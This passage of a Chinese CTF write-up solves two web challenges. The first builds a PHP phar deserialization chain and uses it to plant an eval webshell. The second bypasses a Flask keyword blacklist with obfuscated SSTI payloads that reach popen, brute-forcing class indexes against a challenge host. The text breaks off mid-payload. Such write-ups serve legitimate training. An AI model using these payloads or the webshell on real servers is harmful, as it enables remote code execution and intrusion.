class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64</span>(<span class="hljs-variable">$data</span>));<br>&#125;<br><span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计</p><p>一开始还以为和之前没变化，然后仔细一看发现第二个漏洞点等于被ban掉了，这里会对我们的pop链进行base64编码+md5加密，所以基本上很难绕过了。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>($str)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">base64_encode(md5(base64_encode(md5($str))))</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以很明显要我们进行phar反序列化，先去文件上传页面将白名单爆破出来，爆破出.atg后缀可以用</p><p>然后就是生成phar文件了</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    public <span class="hljs-variable">$test</span>;<br>    public <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    public <span class="hljs-variable">$source</span>;<br>    public <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    public <span class="hljs-variable">$file</span>;<br>    public <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = new C1e4r();<br><span class="hljs-variable">$b</span> = new Show();<br><span class="hljs-variable">$c</span> = new Test();<br><span class="hljs-variable">$c</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;  <span class="hljs-regexp">//</span>读取文件<br><span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-variable">$b</span>;   <span class="hljs-regexp">//</span>利用了魔术方法__tostring<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$c</span>;  <span class="hljs-regexp">//</span>因为触发了_toString()后,就会由于访问<span class="hljs-variable">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source而触发__get;&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>    public <span class="hljs-variable">$study</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>    public <span class="hljs-variable">$doing</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>    public <span class="hljs-variable">$better</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span> </span>&#123;<br>    public <span class="hljs-variable">$out</span>;<br>&#125;<br><br><span class="hljs-variable">$future</span> = new future();<br><span class="hljs-variable">$today</span> = new today();<br><span class="hljs-variable">$today</span>-&gt;doing = <span class="hljs-variable">$future</span>;<br><span class="hljs-variable">$yesterday</span> = new yesterday();<br><span class="hljs-variable">$yesterday</span>-&gt;<span class="hljs-keyword">study</span> = <span class="hljs-variable">$today</span>;<br><br><br><span class="hljs-variable">$phar</span> = new Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); <span class="hljs-regexp">//</span>生成phar文件<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$yesterday</span>); <span class="hljs-regexp">//</span>触发头是C1e4r类<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-regexp">//</span>生成签名<br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>因为class.php里的类没有发生变化，所以链子还是上题那条。</p><p>然后将生成的exp.phar文件改个后缀改为exp.atg，然后上传，上传成功并且返回了上传路径</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">文件已保存到：uploads/<span class="hljs-built_in">exp</span>.atg ！<br></code></pre></td></tr></table></figure><p>然后就是payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class.php?<span class="hljs-attribute">filename</span>=phar://uploads/exp.atg<br><br>POST：<span class="hljs-attribute">wow</span>=ls /<br></code></pre></td></tr></table></figure><p>但是发现根本找不到payload，这里我找了半天，还用了find命令去搜，也没搜到，所以我就上传了一个webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">class.php?filename=phar://uploads/exp.atg</span><br><span class="language-xml"></span><br><span class="language-xml">POST：wow=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; /var/www/html/shell.php</span><br></code></pre></td></tr></table></figure><p>然后用蚁剑连接，用蚁剑的插件查看phpinfo的信息，终于找到了flag在phpinfo里</p><hr><h3 id="直面天命复仇"><a href="#直面天命复仇" class="headerlink" title="直面天命复仇"></a>直面天命复仇</h3><p>刚看到这题我就怀疑应该又是和之前那题差不多，直接访问&#x2F;aazz然后查看源码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs csharp">&lt;pre&gt;import os<br>import <span class="hljs-built_in">string</span><br><span class="hljs-keyword">from</span> flask import Flask, request, render_template_string, jsonify, send_from_directory<br><span class="hljs-keyword">from</span> a.b.c.d.secret import secret_key<br><br>app = Flask(__name__)<br><br>black_list=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-function">def <span class="hljs-title">waf</span>(<span class="hljs-params">name</span>):</span><br><span class="hljs-function">    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:</span><br><span class="hljs-function">        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.<span class="hljs-title">lower</span>():</span><br><span class="hljs-function">            <span class="hljs-keyword">return</span> True</span><br><span class="hljs-function">    <span class="hljs-keyword">return</span> False</span><br><span class="hljs-function">def <span class="hljs-title">is_typable</span>(<span class="hljs-params"><span class="hljs-built_in">char</span></span>):</span><br><span class="hljs-function">    # 定义可通过标准 QWERTY 键盘输入的字符集</span><br><span class="hljs-function">    typable_chars</span> = <span class="hljs-built_in">string</span>.ascii_letters + <span class="hljs-built_in">string</span>.digits + <span class="hljs-built_in">string</span>.punctuation + <span class="hljs-built_in">string</span>.whitespace<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">char</span> <span class="hljs-keyword">in</span> typable_chars<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br><span class="hljs-function">def <span class="hljs-title">home</span>():</span><br><span class="hljs-function">    <span class="hljs-keyword">return</span> <span class="hljs-title">send_from_directory</span>(<span class="hljs-params"><span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">@app.<span class="hljs-title">route</span>(<span class="hljs-params"><span class="hljs-string">&#x27;/jingu&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function">def <span class="hljs-title">greet</span>():</span><br><span class="hljs-function">    template1</span>=<span class="hljs-string">&quot;&quot;</span><br>    template2=<span class="hljs-string">&quot;&quot;</span><br>    name = request.form.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = f<span class="hljs-string">&#x27;&#123;name&#125;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">waf</span>(<span class="hljs-params">name</span>):</span><br><span class="hljs-function">        template</span> = <span class="hljs-string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;3.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">is_typable</span>(<span class="hljs-params">i</span>):</span><br><span class="hljs-function">                <span class="hljs-keyword">continue</span></span><br><span class="hljs-function">            k</span>=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>            <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">not</span> (<span class="hljs-params">secret_key[:<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> name <span class="hljs-keyword">and</span> secret_key[<span class="hljs-number">2</span>:]</span>):</span><br><span class="hljs-function">                template</span> = <span class="hljs-string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;4.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(template)<br>            template1 = <span class="hljs-string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;</span><br>            template= template.replace(<span class="hljs-string">&quot;天命&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&quot;</span>).replace(<span class="hljs-string">&quot;难违&quot;</span>,<span class="hljs-string">&quot;&#125;&#125;&quot;</span>)<br>            template = template<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-keyword">in</span> template:<br>        template2 = <span class="hljs-string">&#x27;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;2.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template1+render_template_string(template)+render_template_string(template2)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        error_message = f<span class="hljs-string">&quot;500报错了，查询语句如下：&lt;br&gt;&#123;template&#125;&quot;</span><br>        <span class="hljs-keyword">return</span> error_message, <span class="hljs-number">400</span><br><br>@app.route(<span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br><span class="hljs-function">def <span class="hljs-title">hinter</span>():</span><br><span class="hljs-function">    template</span>=<span class="hljs-string">&quot;hint：&lt;br&gt;有一个aazz路由，去那里看看吧，天命人!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br>@app.route(<span class="hljs-string">&#x27;/aazz&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br><span class="hljs-function">def <span class="hljs-title">finder</span>():</span><br><span class="hljs-function">    <span class="hljs-keyword">with</span> <span class="hljs-title">open</span>(<span class="hljs-params">__file__, <span class="hljs-string">&#x27;r&#x27;</span></span>) <span class="hljs-keyword">as</span> f:</span><br><span class="hljs-function">        source_code</span> = f.read()<br>    <span class="hljs-keyword">return</span> f<span class="hljs-string">&quot;&lt;pre&gt;&#123;source_code&#125;&lt;/pre&gt;&quot;</span>, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>代码审计</p><p>这里&#x2F;aazz的代码变了，不可控了，只能读取app.py源码，但是secret_key直接在源码里就能看到。应该只是把上题直接读取flag给ban了。这题的secret_key变成了<code>天命难违</code>，然后看了半天没发现其他变化，除了waf过滤变了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">black_list</span>=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br></code></pre></td></tr></table></figure><p>在之前的基础上又多过滤了一些东西。这里lipsum不给用了，所以得重新构造ssti payload。</p><p>payload构造：</p><p>首先这里我先用脚本找到能进行命令执行的类，即&lt;class ‘os._wrap_close’&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://node1.tgctf.woooo.tech:31726/jingu&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">r&quot;天命()[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fba&#x27;&#x27;se\x5f\x5f&#x27;][&#x27;\x5f\x5fsubcl&#x27;&#x27;asses\x5f\x5f&#x27;]()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]难违&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-comment">#print(response.text)</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment">#输出132</span><br></code></pre></td></tr></table></figure><p>然后就是payload构造了。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs llvm">天命()[&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fcla&#x27;&#x27;ss\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fba&#x27;&#x27;se\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fsubcl&#x27;&#x27;asses\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;]()[<span class="hljs-number">132</span>][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fin&#x27;&#x27;it\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>fglo&#x27;&#x27;bals\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls&#x27;)[&#x27;re&#x27;&#x27;ad&#x27;]()难违<br><br><br>天命()[&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span 